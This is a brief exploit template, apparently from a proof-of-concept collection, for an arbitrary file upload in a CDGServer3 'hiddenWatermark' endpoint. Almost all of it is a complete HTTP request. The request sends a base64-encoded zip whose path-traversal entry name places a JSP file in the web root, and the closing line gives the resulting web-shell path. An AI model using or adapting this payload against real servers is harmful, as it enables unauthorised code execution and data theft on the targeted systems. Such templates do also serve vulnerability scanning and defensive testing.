# yst_hiddenWatermark_fileupload
2024/1/29 @2
from: https://mp.weixin.qq.com/s/BVNDai7H7DPNb5OwNxOgrg
```
POST /CDGServer3/hiddenWatermark/uploadFile HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3lm0J8uEuFHxy191
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

------WebKitFormBoundary3lm0J8uEuFHxy191
Content-Disposition: form-data; name="doc"; filename="{{filename}}.zip"
Content-Type: application/zip

{{base64_decode("UEsDBBQAAAAIAAAAIQD5T26PZgAAAHAAAAAVAAAALi4vLi4vLi4vanMvY2VzaGkuanNwHcgxDsIwDAXQnVOESpXixRcoYkSMCAZmq/0CIysOqVuuD2V879Dvki/BtWkJK7k7w8zT3ZtN+46Ggk96ySqszic1ZKnVdJRQL/xAXCF2kXjmhveCOba7oa2G+DcR8YSfkGlI/fELUEsDBBQAAAAIAAAAIQDGTjiHSQAAAGcAAAAWAAAAdGhlbWUvdGhlbWUvdGhlbWUxLnhtbLNR1NWtVnLLzEn1S8xNVbJSSkxMVNIBCwRnVoEEjIyMgAKhxalFcBVAvktqQWJRSW5qXglMBKTC0wXGK8kEqzU0Mlaq1dW1AwBQSwECFAAUAAAACAAAACEA+U9uj2YAAABwAAAAFQAAAAAAAAAAAAAAgAEAAAAALi4vLi4vLi4vanMvY2VzaGkuanNwUEsBAhQAFAAAAAgAAAAhAMZOOIdJAAAAZwAAABYAAAAAAAAAAAAAAIABmQAAAHRoZW1lL3RoZW1lL3RoZW1lMS54bWxQSwUGAAAAAAIAAgCHAAAAFgEAAAAA")}}
------WebKitFormBoundary3lm0J8uEuFHxy191--


shell: /CDGServer3/js/ceshi.jsp
```
